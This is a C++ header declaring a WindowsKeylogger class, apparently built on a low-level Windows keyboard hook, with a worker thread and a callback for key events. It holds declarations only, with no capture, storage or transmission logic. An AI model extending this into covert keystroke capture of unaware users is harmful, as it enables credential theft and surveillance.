#pragma once
#ifdef _WIN32

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <atomic>
#include <functional>
#include <mutex>
#include <thread>

#include "keylogger.hpp"

class WindowsKeylogger : public IKeylogger {
public:
    ~WindowsKeylogger() override;
    bool start() override;
    void stop() override;
    void setEventCallback(std::function<void(const KeyEvent&)> cb) override;

private:
    static LRESULT CALLBACK hookProc(int code, WPARAM wp, LPARAM lp);

    HHOOK                                m_hook{};
    std::thread                          m_thread;
    DWORD                                m_threadId{};
    std::atomic<bool>                    m_running{false};
    bool                                 m_hookOk{false};
    std::mutex                           m_mu;
    std::function<void(const KeyEvent&)> m_callback;
};

#endif // _WIN32
